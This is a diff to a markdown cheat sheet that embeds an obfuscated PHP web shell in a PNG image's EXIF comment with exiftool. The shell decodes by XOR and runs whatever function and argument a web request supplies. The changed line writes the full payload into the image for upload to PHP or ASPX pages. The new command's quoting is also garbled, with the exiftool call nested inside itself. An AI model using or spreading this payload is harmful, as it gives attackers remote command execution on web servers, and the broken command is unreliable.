@@ -16,8 +16,7 @@ SHELL = {`<?php $_="{";$_=($_^"<").($_^">;").($_^"/");?><?=${'_'.$_}["_"](${'_'.
 
 ##### Download <img height="33" width="33" src="https://www.google.com/images/branding/googleg/1x/googleg_standard_color_128dp.png"><a href="https://www.google.com/images/branding/googleg/1x/googleg_standard_color_128dp.png">Img<a> 
 
- `exiftool -Comment="SHELL __halt_compiler();" googleg_standard_color_128dp.png`
-
+ `exiftool -Comment='exiftool -Comment="<?php $_="{";$_=($_^"<").($_^">;").($_^"/");?><?=${'_'.$_}["_"](${'_'.$_}["__"]); __halt_compiler();' googleg_standard_color_128dp.png`
 <hr>
 
 ###### Scope : only view x.php?x=x | and | x.aspx?x=x
